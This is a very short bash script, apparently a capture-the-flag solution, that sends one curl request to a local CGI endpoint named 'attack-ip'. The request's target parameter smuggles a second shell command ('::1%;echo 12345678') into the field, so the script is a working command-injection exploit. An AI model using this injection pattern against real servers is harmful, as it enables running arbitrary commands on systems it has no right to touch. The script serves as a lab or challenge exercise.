#!/usr/bin/env bash
#!CMD: ./solve.sh
<++>
curl -sL "localhost:1337/cgi-bin/attack-ip?name=fff&target=$(echo "::1%;echo 12345678" | urlencode)"
